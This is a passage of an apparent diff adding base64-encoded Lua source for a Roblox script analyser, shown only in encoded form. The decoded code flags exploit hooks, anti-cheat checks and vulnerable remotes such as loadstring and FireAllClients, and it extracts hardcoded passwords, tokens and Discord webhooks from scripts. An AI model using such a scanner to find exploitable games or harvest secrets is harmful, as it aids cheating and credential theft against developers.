+'cmM6Z21hdGNoKCJzdHJpbmclLnNwbGl0IikgZG8gZWMgPSBlYyArIDEgZW5kCiAgICBpZiBlYyA+PSA0IHRoZW4gclsjcisxXSA9IHsgbHZsID0gIkxPVyIs',
+'IGRlc2MgPSAiSGVhdnkgc3RyaW5nIG1hbmlwdWxhdGlvbiBjb3VudD0iIC4uIGVjIH0gZW5kCiAgICBpZiBzcmM6ZmluZCgibWF0aCUucmFuZG9tIikgYW5k',
+'IChzcmM6ZmluZCgidGFibGUlLnNvcnQiKSBvciBzcmM6ZmluZCgidGFibGUlLmluc2VydCIpKSB0aGVuCiAgICAgICAgclsjcisxXSA9IHsgbHZsID0gIk1F',
+'RElVTSIsIGRlc2MgPSAiUmFuZG9tICsgdGFibGUgc2h1ZmZsZSBwYXR0ZXJuIiB9CiAgICBlbmQKICAgIGlmIHNyYzpmaW5kKCJnbWF0Y2giKSBhbmQgc3Jj',
+'OmZpbmQoImdzdWIiKSBhbmQgYmMgPj0gMiB0aGVuCiAgICAgICAgclsjcisxXSA9IHsgbHZsID0gIkhJR0giLCBkZXNjID0gImdtYXRjaCtnc3ViK2J5dGUg',
+'dHJhbnNmb3JtIGNoYWluIiB9CiAgICBlbmQKICAgIHJldHVybiByCmVuZAoKbG9jYWwgZnVuY3Rpb24gZGV0ZWN0SG9va3Moc3JjKQogICAgbG9jYWwgciA9',
+'IHt9CiAgICBpZiB0eXBlKHNyYykgfj0gInN0cmluZyIgb3IgI3NyYyA9PSAwIHRoZW4gcmV0dXJuIHIgZW5kCiAgICBpZiBzcmM6ZmluZCgiaG9va2Z1bmN0',
+'aW9uIikgdGhlbiByWyNyKzFdID0geyBsdmwgPSAiQ1JJVElDQUwiLCBkZXNjID0gImhvb2tmdW5jdGlvbiB1c2VkIiB9IGVuZAogICAgaWYgc3JjOmZpbmQo',
+'Im5ld2NjbG9zdXJlIikgdGhlbiByWyNyKzFdID0geyBsdmwgPSAiTUVESVVNIiwgZGVzYyA9ICJuZXdjY2xvc3VyZSB1c2VkIiB9IGVuZAogICAgaWYgc3Jj',
+'OmZpbmQoImNsb25lZnVuY3Rpb24iKSBvciBzcmM6ZmluZCgicmVwbGFjZWNsb3N1cmUiKSB0aGVuIHJbI3IrMV0gPSB7IGx2bCA9ICJNRURJVU0iLCBkZXNj',
+'ID0gIkZ1bmN0aW9uIGNsb25pbmcvcmVwbGFjZW1lbnQiIH0gZW5kCiAgICBpZiBzcmM6ZmluZCgiZ2V0cmF3bWV0YXRhYmxlIikgdGhlbiByWyNyKzFdID0g',
+'eyBsdmwgPSAiTUVESVVNIiwgZGVzYyA9ICJnZXRyYXdtZXRhdGFibGUgLSBtZXRhdGFibGUgdGFtcGVyaW5nIiB9IGVuZAogICAgaWYgc3JjOmZpbmQoIl9f',
+'bWV0YXRhYmxlIikgdGhlbiByWyNyKzFdID0geyBsdmwgPSAiTUVESVVNIiwgZGVzYyA9ICJfX21ldGF0YWJsZSBsb2NrZWQiIH0gZW5kCiAgICBpZiBzcmM6',
+'ZmluZCgiX19pbmRleCIpIGFuZCAoc3JjOmZpbmQoImhvb2siKSBvciBzcmM6ZmluZCgib3JpZ2luYWwiKSkgdGhlbiByWyNyKzFdID0geyBsdmwgPSAiTUVE',
+'SVVNIiwgZGVzYyA9ICJfX2luZGV4IG92ZXJyaWRlIGRldGVjdGVkIiB9IGVuZAogICAgaWYgc3JjOmZpbmQoIl9fbmV3aW5kZXgiKSBhbmQgKHNyYzpmaW5k',
+'KCJob29rIikgb3Igc3JjOmZpbmQoIm9yaWdpbmFsIikpIHRoZW4gclsjcisxXSA9IHsgbHZsID0gIk1FRElVTSIsIGRlc2MgPSAiX19uZXdpbmRleCBvdmVy',
+'cmlkZSBkZXRlY3RlZCIgfSBlbmQKICAgIGlmIHNyYzpmaW5kKCJzZXRyZWFkb25seSIpIGFuZCBzcmM6ZmluZCgibWV0YXRhYmxlIikgdGhlbiByWyNyKzFd',
+'ID0geyBsdmwgPSAiTUVESVVNIiwgZGVzYyA9ICJNZXRhdGFibGUgcmVhZG9ubHkgYnlwYXNzIiB9IGVuZAogICAgaWYgc3JjOmZpbmQoImRlYnVnJS5zZXRt',
+'ZXRhdGFibGUiKSBvciBzcmM6ZmluZCgiZGVidWclLmdldG1ldGF0YWJsZSIpIHRoZW4gclsjcisxXSA9IHsgbHZsID0gIkxPVyIsIGRlc2MgPSAiZGVidWcu',
+'c2V0L2dldG1ldGF0YWJsZSIgfSBlbmQKICAgIGlmIHNyYzpmaW5kKCJob29rbWV0YW1ldGhvZCIpIHRoZW4gclsjcisxXSA9IHsgbHZsID0gIkNSSVRJQ0FM',
+'IiwgZGVzYyA9ICJob29rbWV0YW1ldGhvZCAtIG1ldGFob29rIGluamVjdGlvbiIgfSBlbmQKICAgIGlmIHNyYzpmaW5kKCJzZXRyYXdtZXRhdGFibGUiKSB0',
+'aGVuIHJbI3IrMV0gPSB7IGx2bCA9ICJISUdIIiwgZGVzYyA9ICJzZXRyYXdtZXRhdGFibGUgLSByYXcgbWV0YXRhYmxlIHdyaXRlIiB9IGVuZAogICAgaWYg',
+'c3JjOmZpbmQoInNldHJlYWRvbmx5IikgdGhlbiByWyNyKzFdID0geyBsdmwgPSAiTUVESVVNIiwgZGVzYyA9ICJzZXRyZWFkb25seSAtIGJ5cGFzcyByZWFk',
+'LW9ubHkiIH0gZW5kCiAgICBpZiBzcmM6ZmluZCgiZ2V0c2VudiIpIG9yIHNyYzpmaW5kKCJnZXRyZW52IikgdGhlbiByWyNyKzFdID0geyBsdmwgPSAiSElH',
+'SCIsIGRlc2MgPSAiRW52aXJvbm1lbnQgYWNjZXNzIChnZXRzZW52L2dldHJlbnYpIiB9IGVuZAogICAgaWYgc3JjOmZpbmQoInNldHVwdmFsdWUiKSB0aGVu',
+'IHJbI3IrMV0gPSB7IGx2bCA9ICJNRURJVU0iLCBkZXNjID0gInNldHVwdmFsdWUgLSB1cHZhbHVlIG1vZGlmaWNhdGlvbiIgfSBlbmQKICAgIGlmIHNyYzpm',
+'aW5kKCJnZXR1cHZhbHVlIikgdGhlbiByWyNyKzFdID0geyBsdmwgPSAiTUVESVVNIiwgZGVzYyA9ICJnZXR1cHZhbHVlIC0gdXB2YWx1ZSByZWFkaW5nIiB9',
+'IGVuZAogICAgaWYgc3JjOmZpbmQoImdldGNvbnN0YW50cyIpIHRoZW4gclsjcisxXSA9IHsgbHZsID0gIk1FRElVTSIsIGRlc2MgPSAiZ2V0Y29uc3RhbnRz',
+'IC0gY29uc3RhbnQgZXh0cmFjdGlvbiIgfSBlbmQKICAgIGlmIHNyYzpmaW5kKCJnZXRzY3JpcHRieXRlY29kZSIpIHRoZW4gclsjcisxXSA9IHsgbHZsID0g',
+'Ik1FRElVTSIsIGRlc2MgPSAiZ2V0c2NyaXB0Ynl0ZWNvZGUgLSBieXRlY29kZSByZWFkaW5nIiB9IGVuZAogICAgaWYgc3JjOmZpbmQoInNldGNsaXBib2Fy',
+'ZCIpIHRoZW4gclsjcisxXSA9IHsgbHZsID0gIkxPVyIsIGRlc2MgPSAic2V0Y2xpcGJvYXJkIC0gY2xpcGJvYXJkIGFjY2VzcyIgfSBlbmQKICAgIHJldHVy',
+'biByCmVuZAoKbG9jYWwgZnVuY3Rpb24gZGVlcEFuYWx5emUoc3JjKQogICAgbG9jYWwgciA9IHsgY3JlZHMgPSB7fSwgY2hhdENtZHMgPSB7fSwgdnVsbnMg',
+'PSB7fSwgZXh0Q29ubnMgPSB7fSwgYXNzZXRDdHggPSB7fSwgYW50aUNoZWF0ID0ge30sIG9iZnVzY2F0aW9uID0ge30sIGhvb2tzID0ge30gfQogICAgaWYg',
+'dHlwZShzcmMpIH49ICJzdHJpbmciIG9yICNzcmMgPT0gMCB0aGVuIHJldHVybiByIGVuZAogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGZvciBpZCBp',
+'biBzcmM6Z21hdGNoKCJVc2VySWQlcyo9JXMqKCVkKykiKSBkbwogICAgICAgICAgICBpZiB0b251bWJlcihpZCkgYW5kICNpZCA+IDUgdGhlbiByLmNyZWRz',
+'WyNyLmNyZWRzKzFdID0gIkhhcmRjb2RlZCBVc2VySWQ6ICIgLi4gaWQgZW5kCiAgICAgICAgZW5kCiAgICAgICAgaWYgc3JjOmZpbmQoImdhbWUlLkNyZWF0',
+'b3JJZCIpIGFuZCBzcmM6ZmluZCgiVXNlcklkIikgdGhlbiByLmNyZWRzWyNyLmNyZWRzKzFdID0gIk93bmVyIGNoZWNrIC0gYnlwYXNzYWJsZSAoZ2FtZS5D',
+'cmVhdG9ySWQgdnMgVXNlcklkKSIgZW5kCiAgICAgICAgZm9yIHZhciwgdmFsIGluIHNyYzpnbWF0Y2goIihbJXdfXSspJXMqPSVzKlwiKFteXCJdKylcIiIp',
+'IGRvCiAgICAgICAgICAgIGxvY2FsIGx2ID0gdmFyOmxvd2VyKCkKICAgICAgICAgICAgaWYgbHY6ZmluZCgicGFzcyIpIG9yIGx2OmZpbmQoInNlY3JldCIp',
+'IG9yIGx2OmZpbmQoInRva2VuIikgb3IgbHY6ZmluZCgia2V5IikgYW5kIG5vdCBsdjpmaW5kKCJrZXlib2FyZCIpIHRoZW4KICAgICAgICAgICAgICAgIHIu',
+'Y3JlZHNbI3IuY3JlZHMrMV0gPSAiU3VzcGljaW91cyB2YXI6ICIgLi4gdmFyIC4uICI9XCIiIC4uIHRydW5jKHZhbCwgNjApIC4uICJcIiIKICAgICAgICAg',
+'ICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgZm9yIF8sIHAgaW4gaXBhaXJzKHsgInBhc3N3b3JkIiwgInBhc3N3ZCIsICJwd2QiLCAiYXBpa2V5IiwgImFw',
+'aV9rZXkiLCAid2ViaG9vayIsICJkaXNjb3JkIiwgInRva2VuIiB9KSBkbwogICAgICAgICAgICBmb3IgdmFsIGluIHNyYzpnbWF0Y2gocCAuLiAiJXMqWzo9',
+'XSVzKlwiKFteXCJdKylcIiIpIGRvCiAgICAgICAgICAgICAgICBpZiAjdmFsID4gMyB0aGVuIHIuY3JlZHNbI3IuY3JlZHMrMV0gPSBwIC4uICI6IFwiIiAu',
+'LiB0cnVuYyh2YWwsIDYwKSAuLiAiXCIiIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAg',
+'ICAgICBpZiBzcmM6ZmluZCgiQ2hhdHRlZCIpIHRoZW4KICAgICAgICAgICAgZm9yIGNtZCBpbiBzcmM6Z21hdGNoKCJcIihbLyUhXSV3KylcIiIpIGRvIHIu',
+'Y2hhdENtZHNbI3IuY2hhdENtZHMrMV0gPSBjbWQgZW5kCiAgICAgICAgICAgIGZvciBjbWQgaW4gc3JjOmdtYXRjaCgiJyhbLyUhXSV3KyknIikgZG8gci5j',
+'aGF0Q21kc1sjci5jaGF0Q21kcysxXSA9IGNtZCBlbmQKICAgICAgICAgICAgZm9yIGNtZCBpbiBzcmM6Z21hdGNoKCJGaW5kRmlyc3RDaGlsZCUoXCIoW15c',
+'Il0rKVwiJSkiKSBkbyByLmNoYXRDbWRzWyNyLmNoYXRDbWRzKzFdID0gIkNtZE9iajogIiAuLiBjbWQgZW5kCiAgICAgICAgZW5kCiAgICAgICAgaWYgc3Jj',
+'OmZpbmQoIkNoYXRTZXJ2aWNlIikgdGhlbgogICAgICAgICAgICBmb3IgY21kIGluIHNyYzpnbWF0Y2goIlwiKFsvJSFdJXcrKVwiIikgZG8gci5jaGF0Q21k',
+'c1sjci5jaGF0Q21kcysxXSA9IGNtZCBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCB2dWxuTWFw',
+'ID0gewogICAgICAgICAgICB7ICJGaXJlQWxsQ2xpZW50cyIsICJDUklUSUNBTCIsICJGaXJlQWxsQ2xpZW50cyAtIHNlcnZlciBicm9hZGNhc3RzIHRvIGFs',
+'bCIsIDUgfSwKICAgICAgICAgICAgeyAibG9hZHN0cmluZyIsICJDUklUSUNBTCIsICJsb2Fkc3RyaW5nIC0gY29kZSBpbmplY3Rpb24gcmlzayIsIDUgfSwK',
+'ICAgICAgICAgICAgeyB7ICJHZXRmZW52IiwgInNldGZlbnYiIH0sICJISUdIIiwgImdldGZlbnYvc2V0ZmVudiAtIHNhbmRib3ggZXNjYXBlIiwgNCB9LAog',
+'ICAgICAgICAgICB7IHsgIlVwZGF0ZUFzeW5jIiwgIlNldEFzeW5jIiB9LCAiSElHSCIsICJEYXRhU3RvcmUgU2V0L1VwZGF0ZSAtIGluamVjdGlvbiByaXNr',
+'IiwgNCB9LAogICAgICAgICAgICB7ICJkZWJ1ZyUuIiwgIk1FRElVTSIsICJkZWJ1Zy4qIC0gc2FuZGJveCBlc2NhcGUgcG90ZW50aWFsIiwgMyB9LAogICAg',
+'ICAgICAgICB7ICJsb2FkaW5zdGFuY2UiLCAiTUVESVVNIiwgImxvYWRpbnN0YW5jZSAtIGJpbmFyeSBvYmplY3QgbG9hZCIsIDMgfSwKICAgICAgICAgICAg',
+'eyAiSHR0cEdldEFzeW5jIiwgIk1FRElVTSIsICJIdHRwR2V0QXN5bmMgLSB3ZWIgcmVxdWVzdCIsIDMgfSwKICAgICAgICAgICAgeyAiSHR0cFBvc3RBc3lu',
+'YyIsICJNRURJVU0iLCAiSHR0cFBvc3RBc3luYyAtIHdlYiBwb3N0IiwgMyB9LAogICAgICAgICAgICB7IHsgIlJvYmxveFJlcGxpY2F0ZWRTdG9yYWdlIiwg',
+'IlJvYmxveFNlcnZlclN0b3JhZ2UiIH0sICJNRURJVU0iLCAiRGlyZWN0IFJvYmxveCBzdG9yYWdlIHJlZmVyZW5jZXMiLCAzIH0sCiAgICAgICAgICAgIHsg',
+'IkdldFJlbW90ZUV2ZW50QW5kUGFyYW1zIiwgIk1FRElVTSIsICJSZW1vdGUgcGFyYW1ldGVyIGluc3BlY3Rpb24iLCAzIH0sCiAgICAgICAgICAgIHsgIkdl',
+'dERlYnVnSWQiLCAiTE9XIiwgIkdldERlYnVnSWQgLSBpbnN0YW5jZSB0cmFja2luZyIsIDIgfSwKICAgICAgICAgICAgeyAiR2V0RnVsbE5hbWUiLCAiTE9X',
+'IiwgIkdldEZ1bGxOYW1lIC0gcGF0aCBleHBvc3VyZSIsIDIgfSwKICAgICAgICB9CiAgICAgICAgZm9yIF8sIHZjIGluIGlwYWlycyh2dWxuTWFwKSBkbwog',
+'ICAgICAgICAgICBsb2NhbCBwYXRzID0gdHlwZSh2Y1sxXSkgPT0gInRhYmxlIiBhbmQgdmNbMV0gb3IgeyB2Y1sxXSB9CiAgICAgICAgICAgIGZvciBfLCBw',
+'IGluIGlwYWlycyhwYXRzKSBkbwogICAgICAgICAgICAgICAgaWYgc3JjOmZpbmQocCwgMSwgbm90IHA6bWF0Y2goIiVXIikgYW5kIHRydWUgb3IgbmlsKSB0',
+'aGVuCiAgICAgICAgICAgICAgICAgICAgci52dWxuc1sjci52dWxucysxXSA9IHsgbHZsID0gdmNbMl0sIGRlc2MgPSB2Y1szXSwgc2NyID0gdmNbNF0gfQog',
+'ICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgaWYgc3JjOmZp',
+'bmQoIkh0dHBTZXJ2aWNlIikgYW5kIChzcmM6ZmluZCgiR2V0QXN5bmMiKSBvciBzcmM6ZmluZCgiUG9zdEFzeW5jIikpIHRoZW4gci52dWxuc1sjci52dWxu',
+'cysxXSA9IHsgbHZsID0gIkhJR0giLCBkZXNjID0gIkh0dHBTZXJ2aWNlIGV4dGVybmFsIHJlcXVlc3QiLCBzY3IgPSA0IH0gZW5kCiAgICAgICAgaWYgc3Jj',
+'OmZpbmQoIkRlbGF5IikgYW5kIHNyYzpmaW5kKCJzdHJpbmciKSB0aGVuIHIudnVsbnNbI3IudnVsbnMrMV0gPSB7IGx2bCA9ICJMT1ciLCBkZXNjID0gIkRl',
+'bGF5IHdpdGggc3RyaW5nIGFyZyAtIGxlZ2FjeSByaXNrIiwgc2NyID0gMiB9IGVuZAogICAgICAgIGlmIHNyYzpmaW5kKCJ0b3N0cmluZyIpIGFuZCBzcmM6',
+'ZmluZCgibG9hZCIpIHRoZW4gci52dWxuc1sjci52dWxucysxXSA9IHsgbHZsID0gIkhJR0giLCBkZXNjID0gImxvYWQodG9zdHJpbmcoLi4uKSkgLSBkeW5h',
+'bWljIGNvZGUgbG9hZCIsIHNjciA9IDQgfSBlbmQKICAgICAgICBpZiBzcmM6ZmluZCgiRmlyZVNlcnZlciIpIGFuZCBzcmM6ZmluZCgiY29tcHJvbWlzZWQi',
+'KSB0aGVuIHIudnVsbnNbI3IudnVsbnMrMV0gPSB7IGx2bCA9ICJDUklUSUNBTCIsIGRlc2MgPSAiRmlyZVNlcnZlciArIGNvbXByb21pc2VkIGNoZWNrIiwg',
+'c2NyID0gNSB9IGVuZAogICAgICAgIGlmIHNyYzpmaW5kKCJGaXJlU2VydmVyIikgYW5kIHNyYzpmaW5kKCJjaGVhdCIpIHRoZW4gci52dWxuc1sjci52dWxu',
+'cysxXSA9IHsgbHZsID0gIkhJR0giLCBkZXNjID0gIkZpcmVTZXJ2ZXIgKyBjaGVhdCBrZXl3b3JkIiwgc2NyID0gNCB9IGVuZAogICAgICAgIGlmIHNyYzpm',
+'aW5kKCJTZXRBdHRyaWJ1dGUiKSBhbmQgKHNyYzpmaW5kKCJleHBsb2l0Iikgb3Igc3JjOmZpbmQoImNoZWF0IikpIHRoZW4gci52dWxuc1sjci52dWxucysx',
+'XSA9IHsgbHZsID0gIkhJR0giLCBkZXNjID0gIkF0dHJpYnV0ZS1iYXNlZCBleHBsb2l0IHRhZ2dpbmciLCBzY3IgPSA0IH0gZW5kCiAgICAgICAgaWYgc3Jj',
+'OmZpbmQoIkNvbnRlbnRQcm92aWRlciIpIGFuZCBzcmM6ZmluZCgiUHJlbG9hZCIpIHRoZW4gci52dWxuc1sjci52dWxucysxXSA9IHsgbHZsID0gIkxPVyIs',
+'IGRlc2MgPSAiQ29udGVudFByb3ZpZGVyOlByZWxvYWQgdXNhZ2UiLCBzY3IgPSAyIH0gZW5kCiAgICAgICAgaWYgc3JjOmZpbmQoIkRpc2Nvbm5lY3QiKSBh',
+'bmQgc3JjOmZpbmQoIndhcm4iKSB0aGVuIHIudnVsbnNbI3IudnVsbnMrMV0gPSB7IGx2bCA9ICJMT1ciLCBkZXNjID0gIkRpc2Nvbm5lY3QgKyB3YXJuIChk',
+'aXNjb25uZWN0aW9uIGxvZ2dpbmcpIiwgc2NyID0gMiB9IGVuZAogICAgZW5kKQogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGZvciB1cmwgaW4gc3Jj',
+'OmdtYXRjaCgiaHR0cHM/Oi8vW15cIiclKSVzXSsiKSBkbwogICAgICAgICAgICBsb2NhbCBjbGVhbiA9IHVybDpnc3ViKCJbXiV3JS46LyUlfiUtXz8mPSNd',
+'IiwgIiIpCiAgICAgICAgICAgIGlmICNjbGVhbiA+IDggdGhlbiByLmV4dENvbm5zWyNyLmV4dENvbm5zKzFdID0gY2xlYW4gZW5kCiAgICAgICAgZW5kCiAg',
+'ICAgICAgZm9yIHBpZCBpbiBzcmM6Z21hdGNoKCJUZWxlcG9ydFNlcnZpY2U6VGVsZXBvcnQlKCglZCspIikgZG8gci5leHRDb25uc1sjci5leHRDb25ucysx',
+'XSA9ICJUZWxlcG9ydCAtPiBQbGFjZUlkOiAiIC4uIHBpZCBlbmQKICAgICAgICBmb3IgcGlkIGluIHNyYzpnbWF0Y2goIlRlbGVwb3J0VG9QbGFjZUluc3Rh',
+'bmNlJSgoJWQrKSIpIGRvIHIuZXh0Q29ubnNbI3IuZXh0Q29ubnMrMV0gPSAiVGVsZXBvcnRJbnN0YW5jZSAtPiBQbGFjZUlkOiAiIC4uIHBpZCBlbmQKICAg',
+'ICAgICBmb3Igc2lkIGluIHNyYzpnbWF0Y2goIkdldFByb2R1Y3RJbmZvJSgoJWQrKSIpIGRvIHIuZXh0Q29ubnNbI3IuZXh0Q29ubnMrMV0gPSAiTWFya2V0',
+'cGxhY2UgbG9va3VwIC0+ICIgLi4gc2lkIGVuZAogICAgICAgIGZvciB1cmwgaW4gc3JjOmdtYXRjaCgnSHR0cFNlcnZpY2U6R2V0QXN5bmMlKCIoW14iXSop',
+'IiUpJykgZG8gci5leHRDb25uc1sjci5leHRDb25ucysxXSA9ICJIVFRQIEdldDogIiAuLiB0cnVuYyh1cmwsIDgwKSBlbmQKICAgICAgICBmb3IgdXJsIGlu',
+'IHNyYzpnbWF0Y2goJ0h0dHBTZXJ2aWNlOlBvc3RBc3luYyUoIihbXiJdKikiJSknKSBkbyByLmV4dENvbm5zWyNyLmV4dENvbm5zKzFdID0gIkhUVFAgUG9z',
+'dDogIiAuLiB0cnVuYyh1cmwsIDgwKSBlbmQKICAgICAgICBmb3IgdXJsIGluIHNyYzpnbWF0Y2goJ0h0dHBTZXJ2aWNlOlJlcXVlc3RBc3luYyUoe1tefV0q',
+'dXJsJXMqPSVzKiIoW14iXSopIicpIGRvIHIuZXh0Q29ubnNbI3IuZXh0Q29ubnMrMV0gPSAiSFRUUCBSZXF1ZXN0OiAiIC4uIHRydW5jKHVybCwgODApIGVu',
+'ZAogICAgICAgIGlmIHNyYzpmaW5kKCJUd2VlblNlcnZpY2UiKSB0aGVuIHIuZXh0Q29ubnNbI3IuZXh0Q29ubnMrMV0gPSAiVHdlZW5TZXJ2aWNlIHVzZWQg',
+'KGFuaW1hdGlvbi90aW1pbmcpIiBlbmQKICAgICAgICBpZiBzcmM6ZmluZCgiTWVtb3J5U3RvcmUiKSB0aGVuIHIuZXh0Q29ubnNbI3IuZXh0Q29ubnMrMV0g',
+'PSAiTWVtb3J5U3RvcmVTZXJ2aWNlIC0gY3Jvc3Mtc2VydmVyIHN0YXRlIiBlbmQKICAgICAgICBpZiBzcmM6ZmluZCgiQmluZGFibGVFdmVudCIpIG9yIHNy',
+'YzpmaW5kKCJCaW5kYWJsZUZ1bmN0aW9uIikgdGhlbiByLmV4dENvbm5zWyNyLmV4dENvbm5zKzFdID0gIkJpbmRhYmxlRXZlbnQvRnVuY3Rpb24gKGluLXBy',
+'b2Nlc3MgSVBDKSIgZW5kCiAgICAgICAgaWYgc3JjOmZpbmQoIlVucmVsaWFibGVSZW1vdGVFdmVudCIpIHRoZW4gci5leHRDb25uc1sjci5leHRDb25ucysx',
+'XSA9ICJVbnJlbGlhYmxlUmVtb3RlRXZlbnQgdXNlZCIgZW5kCiAgICAgICAgZm9yIHNpZCBpbiBzcmM6Z21hdGNoKCJHcm91cFNlcnZpY2U6R2V0R3JvdXBB',
+'c3luYyUoKCVkKykiKSBkbyByLmV4dENvbm5zWyNyLmV4dENvbm5zKzFdID0gIkdyb3VwIGxvb2t1cCAtPiAiIC4uIHNpZCBlbmQKICAgICAgICBmb3Igc2lk',
+'IGluIHNyYzpnbWF0Y2goIkdldEdyb3VwSW5mb0FzeW5jJSgoJWQrKSIpIGRvIHIuZXh0Q29ubnNbI3IuZXh0Q29ubnMrMV0gPSAiR3JvdXBJbmZvIGxvb2t1',
+'cCAtPiAiIC4uIHNpZCBlbmQKICAgICAgICBmb3Igc2lkIGluIHNyYzpnbWF0Y2goIkdldFJvbGVJbkdyb3VwJSgoJWQrKSIpIGRvIHIuZXh0Q29ubnNbI3Iu',
+'ZXh0Q29ubnMrMV0gPSAiR3JvdXAgcm9sZSBjaGVjayAtPiAiIC4uIHNpZCBlbmQKICAgICAgICBpZiBzcmM6ZmluZCgiUHJvbXB0UHVyY2hhc2UiKSBvciBz',
+'cmM6ZmluZCgiUHJvbXB0UHJvZHVjdFB1cmNoYXNlIikgdGhlbiByLmV4dENvbm5zWyNyLmV4dENvbm5zKzFdID0gIlB1cmNoYXNlIHByb21wdCAtIG1vbmV0',
+'aXphdGlvbiIgZW5kCiAgICAgICAgaWYgc3JjOmZpbmQoIkltR3VpIikgb3Igc3JjOmZpbmQoImltZ3VpIikgdGhlbiByLmV4dENvbm5zWyNyLmV4dENvbm5z',
+'KzFdID0gIkltR3VpIHVzYWdlIiBlbmQKICAgICAgICBpZiBzcmM6ZmluZCgiQ1RSTCIpIG9yIHNyYzpmaW5kKCJsY3RybCIpIG9yIHNyYzpmaW5kKCJFbnVt',
+'JS5LZXlDb2RlIikgdGhlbiByLmV4dENvbm5zWyNyLmV4dENvbm5zKzFdID0gIktleWJvYXJkIGlucHV0IGNhcHR1cmUiIGVuZAogICAgZW5kKQogICAgcGNh',
+'bGwoZnVuY3Rpb24oKQogICAgICAgIGZvciBsaW5lIGluIHNyYzpnbWF0Y2goIlteXG5dKnJieGFzc2V0aWQ6Ly8lZCtbXlxuXSoiKSBkbwogICAgICAgICAg',
+'ICBsb2NhbCBpZCA9IGxpbmU6bWF0Y2goInJieGFzc2V0aWQ6Ly8oJWQrKSIpCiAgICAgICAgICAgIGxvY2FsIGN0eCA9IHRydW5jKGxpbmUsIDkwKQogICAg',
+'ICAgICAgICBpZiBpZCB0aGVuIHIuYXNzZXRDdHhbI3IuYXNzZXRDdHgrMV0gPSAiQXNzZXQgIiAuLiBpZCAuLiAiOiAiIC4uIGN0eCBlbmQKICAgICAgICBl',
+'bmQKICAgICAgICBmb3IgbGluZSBpbiBzcmM6Z21hdGNoKCJbXlxuXSpyYnhhc3NldDovLyVkK1teXG5dKiIpIGRvCiAgICAgICAgICAgIGxvY2FsIGlkID0g',
+'bGluZTptYXRjaCgicmJ4YXNzZXQ6Ly8oJWQrKSIpCiAgICAgICAgICAgIGxvY2FsIGN0eCA9IHRydW5jKGxpbmUsIDkwKQogICAgICAgICAgICBpZiBpZCB0',
+'aGVuIHIuYXNzZXRDdHhbI3IuYXNzZXRDdHgrMV0gPSAiQXNzZXQgIiAuLiBpZCAuLiAiOiAiIC4uIGN0eCBlbmQKICAgICAgICBlbmQKICAgICAgICBmb3Ig',
+'bGluZSBpbiBzcmM6Z21hdGNoKCJodHRwOi8vW15cblwiJ10qcm9ibG94JS5jb21bXlxuXCInXSoiKSBkbwogICAgICAgICAgICByLmFzc2V0Q3R4WyNyLmFz',
+'c2V0Q3R4KzFdID0gIkhUVFAgQXNzZXQgVVJMOiAiIC4uIHRydW5jKGxpbmUsIDkwKQogICAgICAgIGVuZAogICAgZW5kKQogICAgci5hbnRpQ2hlYXQgPSBk',
+'ZXRlY3RBbnRpQ2hlYXQoc3JjKQogICAgci5vYmZ1c2NhdGlvbiA9IGRldGVjdE9iZnVzY2F0aW9uKHNyYykKICAgIHIuaG9va3MgPSBkZXRlY3RIb29rcyhz',
+'cmMpCiAgICByZXR1cm4gcgplbmQKCmxvY2FsIGZ1bmN0aW9uIGlzQnl0ZWNvZGUoc3JjKQogICAgbG9jYWwgb2ssIHNpZyA9IHBjYWxsKHN0cmluZy5jaGFy',
+'LCAyNywgNzYsIDExNywgOTcpCiAgICByZXR1cm4gb2sgYW5kIHNyYzpzdWIoMSwgNCkgPT0gc2lnCmVuZAoKbG9jYWwgZnVuY3Rpb24gYW5hbHl6ZVNvdXJj',
+'ZShzcmMpCiAgICBsb2NhbCByID0geyBhc3NldHMgPSB7fSwgZ2FtZXBhc3MgPSB7fSwgZGV2cHJvZCA9IHt9LCBiYWRnZSA9IHt9LCBzZXJ2aWNlcyA9IHt9',
+'LCByZW1vdGVzID0ge30sIHJlcXVpcmVzID0ge30sIHRhZ3MgPSB7fSwga2V5d29yZHMgPSB7fSwgbGlicmFyaWVzID0ge30sIGR5bmFtaWNSZW1vdGUgPSBm',
+'YWxzZSwgaXNDb25maWcgPSBmYWxzZSwgcmVtb3RlQ3JlYXRpb25zID0ge30sIHNoYXJlZFZhcnMgPSB7fSB9CiAgICBpZiB0eXBlKHNyYykgfj0gInN0cmlu',
+'ZyIgb3IgI3NyYyA9PSAwIHRoZW4gcmV0dXJuIHIgZW5kCiAgICBpZiBpc0J5dGVjb2RlKHNyYykgdGhlbiByLmtleXdvcmRzWyJCWVRFQ09ERSJdID0gdHJ1',
+'ZSBlbmQKICAgIHIucmVtb3RlQ3JlYXRpb25zID0gZXh0cmFjdFJlbW90ZUNyZWF0aW9uKHNyYykKICAgIGxvY2FsIGR5biA9IGV4dHJhY3REeW5hbWljUmVt',
+'b3RlUGF0dGVybnMoc3JjKQogICAgaWYgZHluLmR5bmFtaWNUYWJsZSBvciBkeW4uZHluYW1pY0NhbGwgb3IgZHluLmluZGV4ZWRBY2Nlc3Mgb3IgZHluLmNv',
+'bnN0cnVjdG9yQWNjZXNzIHRoZW4gci5keW5hbWljUmVtb3RlID0gdHJ1ZSBlbmQKICAgIHIuc2hhcmVkVmFycyA9IGV4dHJhY3RTaGFyZWRWYXJBY2Nlc3Mo',
+'c3JjKQogICAgbG9jYWwgc3RyaXBwZWQgPSBzcmM6bWF0Y2goIiVzKiguLSklcyokIikKICAgIGlmIHN0cmlwcGVkIGFuZCBzdHJpcHBlZDptYXRjaCgiXnJl',
+'dHVybiVzKnsiKSBhbmQgc3RyaXBwZWQ6bWF0Y2goIn0lcyokIikgdGhlbiByLmlzQ29uZmlnID0gdHJ1ZSBlbmQKICAgIGZvciBpZCBpbiBzcmM6Z21hdGNo',
+'KCJyYnhhc3NldGlkOi8vKCVkKykiKSBkbyBsb2NhbCBuID0gdG9udW1iZXIoaWQpOyBpZiBuIHRoZW4gci5hc3NldHNbbl0gPSB0cnVlIGVuZCBlbmQKICAg',
